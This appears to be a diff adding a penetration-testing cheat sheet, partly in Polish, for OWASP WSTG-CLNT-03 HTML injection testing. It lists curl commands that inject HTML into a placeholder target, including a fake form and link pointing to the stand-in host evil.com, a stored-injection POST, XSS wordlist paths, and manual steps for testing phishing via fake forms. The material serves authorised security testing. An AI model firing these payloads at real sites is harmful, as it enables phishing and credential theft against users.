@@ -1,0 +1,34 @@
+================================================================================
+WSTG-CLNT-03 — Testing for HTML Injection
+================================================================================
+CELE:
+- Identify HTML injection points and assess the severity
+
+================================================================================
+KOMENDY
+================================================================================
+
+# --- Wstrzykiwanie HTML ---
+curl -s "https://TARGET/search?q=<h1>Injected</h1>" | grep -i "<h1>Injected"
+curl -s "https://TARGET/search?q=<a href=\"http://evil.com\">Click</a>" | grep -i "evil.com"
+curl -s "https://TARGET/search?q=<form action=\"http://evil.com\"><input type=text name=user><input type=submit></form>"
+curl -s "https://TARGET/search?q=<img src=http://evil.com/logo.png>"
+
+# --- Stored HTML injection ---
+curl -X POST "https://TARGET/comment" -d "body=<marquee>HTML Injected</marquee>"
+
+================================================================================
+KOMENDY Z WORDLISTAMI
+================================================================================
+
+# --- Subset of XSS payloads (HTML only, no JS) ---
+# Desktop/WSTG/SecLists-master/Fuzzing/XSS/robot-friendly/XSS-BruteLogic.txt
+# Desktop/WSTG/fuzzdb-master/attack/xss/xss-other.txt
+
+================================================================================
+WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
+================================================================================
+1. Testuj wstrzykiwanie tagow HTML w kazde pole wejsciowe
+2. Sprawdz czy tagi sa renderowane w przegladarce
+3. Testuj phishing via HTML injection (fałszywe formularze)
+4. Sprawdz Content-Type i encoding odpowiedzi
